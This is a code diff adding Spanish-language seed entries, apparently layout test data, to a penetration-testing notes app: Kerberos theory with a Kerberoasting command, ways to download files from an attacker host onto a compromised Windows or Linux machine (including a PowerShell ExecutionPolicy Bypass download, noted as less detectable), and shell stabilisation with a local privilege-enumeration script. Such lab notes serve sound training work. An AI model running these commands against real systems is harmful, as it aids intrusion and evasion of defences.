@@ -338,6 +338,151 @@ ENTRIES = [
             ]},
         ],
     },
+
+    # ── Entradas de prueba de diseño: sin orden, textos y código largos ──
+
+    {
+        # Apunte de teoría: ningún bloque ni comando tiene posición
+        "title": "Apuntes de Kerberos",
+        "description": (
+            "Notas teoricas sobre como funciona Kerberos en un dominio Active Directory. "
+            "No es un procedimiento: los bloques son temas independientes y se pueden leer "
+            "en cualquier orden. Sirve de referencia rapida antes de atacar un DC, para "
+            "recordar que pide cada mensaje, quien cifra que y con que clave."
+        ),
+        "phase": "other", "os": "windows",
+        "tags": ["Kerberos", "Active Directory", "teoria"],
+        "machines": [],
+        "notes": (
+            "El reloj importa: si la diferencia horaria con el DC supera 5 minutos, Kerberos "
+            "devuelve KRB_AP_ERR_SKEW y nada funciona. Sincroniza con ntpdate o faketime antes de "
+            "empezar.\n"
+            "Los tickets viven en memoria (Windows) o en un ccache (Linux, variable KRB5CCNAME).\n"
+            "Si una herramienta de impacket falla con -k, revisa que el nombre del host coincida "
+            "con el SPN: Kerberos no funciona contra una IP, necesita el FQDN."
+        ),
+        "blocks": [
+            {"position": None, "title": "Flujo AS-REQ / TGS-REQ",
+             "description": (
+                 "1) El cliente pide un TGT al KDC (AS-REQ) cifrando un timestamp con su clave. "
+                 "2) El KDC devuelve el TGT cifrado con la clave de krbtgt. "
+                 "3) Con el TGT, el cliente pide un TGS para un servicio concreto (TGS-REQ). "
+                 "4) El TGS va cifrado con la clave de la cuenta de servicio: por eso, si el "
+                 "servicio corre con un usuario y contrasena debil, el ticket se puede crackear offline."
+             ),
+             "commands": []},
+            {"position": None, "title": "Ver tickets en la sesion actual", "description": None, "commands": [
+                {"position": None, "command": "klist", "note": "lista los tickets cacheados (Windows y Linux)", "example": None},
+                {"position": None, "command": "export KRB5CCNAME=<RUTA_CCACHE>",
+                 "note": "en Linux, indica a las herramientas que ccache usar", "example": "export KRB5CCNAME=/tmp/administrator.ccache"},
+            ]},
+            {"position": None, "title": "Kerberoasting (plantilla)",
+             "description": "Pedir TGS de cuentas con SPN y crackearlos offline. Requiere cualquier usuario de dominio.",
+             "commands": [
+                {"position": None,
+                 "command": "impacket-GetUserSPNs <DOMINIO>/<USER>:<PASSWORD> -dc-ip <IP> -request -outputfile <OUT>",
+                 "note": "cada linea del fichero es un hash $krb5tgs$ crackeable con hashcat -m 13100",
+                 "example": "impacket-GetUserSPNs corp.local/jdoe:'Winter2024!' -dc-ip 10.129.10.5 -request -outputfile kerberoast.hashes"},
+            ]},
+        ],
+    },
+    {
+        # Menú de alternativas: el orden da igual, se usa la que funcione
+        "title": "Transferencia de archivos entre atacante y victima",
+        "description": "Formas de mover archivos segun lo que haya disponible en la maquina comprometida.",
+        "phase": "post_exploitation", "os": "multiplatform",
+        "tags": ["file-transfer", "python", "certutil", "PowerShell"],
+        "machines": ["Tactics"],
+        "notes": None,
+        "blocks": [
+            {"position": None, "title": "Servidor HTTP en el atacante", "description": None, "commands": [
+                {"position": None, "command": "python3 -m http.server <LPORT>", "note": "sirve el directorio actual", "example": "python3 -m http.server 8000"},
+            ]},
+            {"position": None, "title": "Descarga desde Linux", "description": "wget o curl, el que exista.", "commands": [
+                {"position": None, "command": "wget http://<LHOST>:<LPORT>/<ARCHIVO> -O /tmp/<ARCHIVO>", "note": None, "example": None},
+                {"position": None, "command": "curl -s http://<LHOST>:<LPORT>/<ARCHIVO> -o /tmp/<ARCHIVO>", "note": None, "example": None},
+            ]},
+            {"position": None, "title": "Descarga desde Windows",
+             "description": (
+                 "certutil suele estar en cualquier Windows pero lo marcan muchos antivirus; "
+                 "PowerShell es mas silencioso y permite cargar el script directamente en memoria sin tocar disco."
+             ),
+             "commands": [
+                {"position": None, "command": "certutil -urlcache -split -f http://<LHOST>:<LPORT>/<ARCHIVO> C:\\Windows\\Temp\\<ARCHIVO>",
+                 "note": "clasico, pero ruidoso", "example": None},
+                {"position": None,
+                 "command": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<LPORT>/<ARCHIVO>', 'C:\\Windows\\Temp\\<ARCHIVO>')\"",
+                 "note": "descarga a disco con WebClient; linea muy larga a proposito para ver el wrap",
+                 "example": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.7:8000/winPEASx64.exe', 'C:\\Windows\\Temp\\winPEASx64.exe')\""},
+            ]},
+        ],
+    },
+    {
+        # Procedimiento con código multilínea, textos largos y orden mixto
+        "title": "Estabilizar una shell y enumerar el host",
+        "description": (
+            "Despues de conseguir una reverse shell basica, convertirla en una TTY completa "
+            "(con historial, tab, Ctrl+C sin matar la sesion y editores que funcionen) y lanzar "
+            "una primera enumeracion local. El ultimo bloque no tiene posicion a proposito: debe "
+            "aparecer al final, despues de los ordenados."
+        ),
+        "phase": "post_exploitation", "os": "linux",
+        "tags": ["TTY", "bash", "python", "enumeracion-local"],
+        "machines": ["Shoppy"],
+        "notes": (
+            "Si no hay python en la victima, prueba 'script /dev/null -c bash' o 'perl -e \"exec \\\"/bin/bash\\\";\"'.\n"
+            "Las filas y columnas del stty deben coincidir con tu terminal: compruebalas con 'stty size' en "
+            "una pestaña local antes de hacer el fg, si no, vim y less se veran descuadrados."
+        ),
+        "blocks": [
+            {"position": 1, "title": "Spawnear una PTY", "description": None, "commands": [
+                {"position": 1, "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "note": "primer paso dentro de la shell", "example": None},
+            ]},
+            {"position": 2, "title": "Pasar la terminal a modo raw",
+             "description": "Se hace en tu maquina: suspendes la shell, ajustas tu terminal y vuelves.",
+             "commands": [
+                {"position": 1,
+                 "command": "# Ctrl+Z para suspender la shell\nstty raw -echo; fg\n# (pulsa Enter dos veces)\nreset xterm\nexport TERM=xterm-256color\nexport SHELL=bash\nstty rows <FILAS> columns <COLUMNAS>",
+                 "note": "secuencia completa en varias lineas",
+                 "example": "stty raw -echo; fg\nreset xterm\nexport TERM=xterm-256color\nstty rows 48 columns 190"},
+            ]},
+            {"position": None, "title": "Enumeracion rapida del host",
+             "description": (
+                 "Script de primera pasada para cuando no se puede subir linpeas. Recoge usuario, "
+                 "kernel, sudo, binarios SUID, capabilities, crons y puertos en escucha. Copialo "
+                 "entero y pegalo en la shell."
+             ),
+             "commands": [
+                {"position": None,
+                 "command": (
+                     "#!/bin/bash\n"
+                     "echo \"[*] Usuario y grupos\"\n"
+                     "id; hostname; uname -a\n"
+                     "\n"
+                     "echo \"[*] Sudo sin password\"\n"
+                     "sudo -n -l 2>/dev/null\n"
+                     "\n"
+                     "echo \"[*] Binarios SUID\"\n"
+                     "find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(proc|snap)'\n"
+                     "\n"
+                     "echo \"[*] Capabilities\"\n"
+                     "getcap -r / 2>/dev/null\n"
+                     "\n"
+                     "echo \"[*] Cron\"\n"
+                     "ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null\n"
+                     "\n"
+                     "echo \"[*] Puertos en escucha\"\n"
+                     "(ss -tulpn || netstat -tulpn) 2>/dev/null | grep LISTEN\n"
+                     "\n"
+                     "for u in $(cut -d: -f1,7 /etc/passwd | grep -E 'sh$' | cut -d: -f1); do\n"
+                     "    echo \"[+] usuario con shell: $u\"\n"
+                     "done"
+                 ),
+                 "note": "script multilinea de ~20 lineas",
+                 "example": None},
+            ]},
+        ],
+    },
 ]
 
 
@@ -351,7 +496,7 @@ def main():
         for data in ENTRIES:
             entry = Entry(
                 title=data["title"], description=data["description"],
-                phase=data["phase"], os=data["os"],
+                phase=data["phase"], os=data["os"], notes=data.get("notes"),
             )
             for b in data["blocks"]:
                 block = Block(position=b["position"], title=b["title"], description=b["description"])
